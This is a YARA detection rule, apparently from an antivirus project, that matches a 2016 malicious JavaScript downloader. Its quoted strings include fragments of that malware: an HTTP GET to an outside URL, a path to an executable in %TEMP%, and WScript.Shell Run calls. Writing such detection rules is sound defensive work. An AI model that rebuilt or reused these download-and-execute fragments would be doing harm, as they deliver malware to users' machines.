rule sig_20160329_4f59daf699fa390f7152043024bd9df7 {
  meta:
    description = "datamaliciousorder - file 20160329_4f59daf699fa390f7152043024bd9df7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "638f594ba321d86fa3e3897e5e7b777e40534b26fb4554eb05a4b9d1250fd2d2"

  strings:
    $s1  = "b[ft](\"GET\", \"http://blog.saletron.net/li9soz\", false);" fullword ascii
    $s2  = "function Yh() {return WO[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"9MSyx6z9y6c8.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[t](L() * 11); if (b[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function CG(f0, H){ym = ym * 1; return f0 - H;};" fullword ascii
    $s5  = "var WO = function Ku() {return WScript[Cw](\"WScript.Shell\");}(), I = 11;" fullword ascii
    $s6  = "function MN(){return \"\" + d0;};" fullword ascii
    $s7  = "function Y() {return ((fr == true) && (fr == x)) ? 1 : ym;};" fullword ascii
    $s8  = "function Ip(wl){WO[\"Run\"](wl, ym, ym);};" fullword ascii
    $s9  = "var m = new this[\"Date\"]();" fullword ascii
    $s10 = "return CG(Kn, kW);" fullword ascii
    $s11 = "function Wl(P) {var Qo = (1, 2, 3, 4, 5, P); return Qo;};" fullword ascii
    $s12 = "function DZ(){return Cw;};" fullword ascii
    $s13 = " while (e){" fullword ascii
    $s14 = "function d()" fullword ascii
    $s15 = "function L(){return 22;};" fullword ascii
    $s16 = "x = true; " fullword ascii
    $s17 = "var x = false;" fullword ascii
    $s18 = "var fr = false;" fullword ascii
    $s19 = "fr = true; " fullword ascii
    $s20 = "} catch(d1){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}